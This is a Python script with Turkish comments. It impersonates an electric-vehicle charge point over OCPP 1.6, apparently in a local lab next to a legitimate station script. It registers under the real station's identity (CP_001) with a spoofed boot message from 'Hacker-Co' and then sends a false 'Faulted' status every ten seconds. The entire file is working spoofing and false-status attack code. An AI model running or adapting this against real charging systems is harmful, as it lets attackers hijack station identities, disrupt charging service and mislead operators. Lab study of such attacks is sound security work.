import asyncio
import logging

from ocpp.v16 import ChargePoint as CP
from ocpp.v16 import call
# Sizin 'mesru_cp.py' kodunuzla aynı import'ları kullanıyoruz
from ocpp.v16.enums import ChargePointStatus, ChargePointErrorCode
import websockets

logging.basicConfig(level=logging.INFO)

class SaldirganChargePoint(CP):

    async def send_boot_notification(self):
        """Sunucuya sahte bir 'Boot' mesajı gönder."""
        req = call.BootNotification(
            charge_point_model="SALDIRGAN-v1", # Farklı bir model
            charge_point_vendor="Hacker-Co"     # Farklı bir üretici
        )
        try:
            resp = await self.call(req)
            status = getattr(resp, "status", None)

            if isinstance(status, str) and status.lower() == "accepted":
                logging.info("SALDIRGAN: Sunucu bizi kabul etti (BootNotification).")
                # Kabul edildiysek, sahte durum göndermeye başla
                asyncio.create_task(self.sahte_durum_gonder())
            else:
                logging.warning(f"SALDIRGAN: Sunucu bizi reddetti: {resp}")
        except Exception as e:
            logging.error(f"SALDIRGAN: BootNotification hatası: {e}")

    async def sahte_durum_gonder(self):
        """Sürekli olarak 'Arızalı' (Faulted) durum bildirimi gönder."""
        while True:
            try:
                await self.call(call.StatusNotification(
                    connector_id=1,
                    # 'Faulted' (Arızalı) durumunu bildir
                    error_code=ChargePointErrorCode.other_error,
                    status=ChargePointStatus.faulted
                ))
                logging.info("SALDIRGAN: Sahte 'Faulted' durumu gönderildi.")

                # Sunucuyu meşgul etmek için 10 saniyede bir tekrarla
                await asyncio.sleep(10)
            except Exception as e:
                logging.error(f"SALDIRGAN: Sahte durum gönderirken hata: {e}")
                break # Hata olursa döngüden çık

async def main():
    uri = "ws://localhost:9000/CP_001" # Meşru istasyonla AYNI KİMLİK
    try:
        async with websockets.connect(uri, subprotocols=["ocpp1.6"]) as ws:
            cp = SaldirganChargePoint("CP_001", ws)

            tasks = [
                asyncio.create_task(cp.start()),
                asyncio.create_task(cp.send_boot_notification()),
                # Saldırganın Heartbeat göndermesine gerek yok,
                # amacı sadece sahte durum basmak.
            ]
            await asyncio.gather(*tasks)
    except Exception as e:
        logging.error(f"SALDIRGAN: Bağlantı hatası: {e}")

if __name__ == "__main__":
    try:
        logging.info("SALDIRGAN devrede... 'CP_001' kimliği taklit ediliyor.")
        asyncio.run(main())
    except KeyboardInterrupt:
        logging.info("SALDIRGAN durduruldu.")
